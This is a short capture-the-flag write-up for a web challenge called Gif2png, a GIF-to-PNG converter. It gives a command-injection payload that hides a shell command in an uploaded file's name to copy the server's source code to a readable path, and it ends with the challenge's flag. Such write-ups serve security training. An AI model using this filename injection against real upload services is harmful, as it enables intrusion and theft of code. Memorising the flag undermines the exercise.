## Gif2png (Web)

Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))

The webdev department created another cool startup. Here you can convert any animated GIF to PNG images. 

It's only left to figure out how to monetize it: [gif2png-cybrics2020.ctf.su](gif2png-cybrics2020.ctf.su)

[src](./gif2png.tar.gz)

---

## Solution

1. Generate uid (upload valid gif and check url part after /result/)

2. Build payload `'$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))'.gif`

3. In new upload request set `filename="BUILT_PAYLOAD"`

4. Check url `http://gif2png-cybrics2020.ctf.su/uploads/GENERATED_UID/main.py` and find `ffLaG`

flag is `cybrics{imagesaresocoolicandrawonthem}`
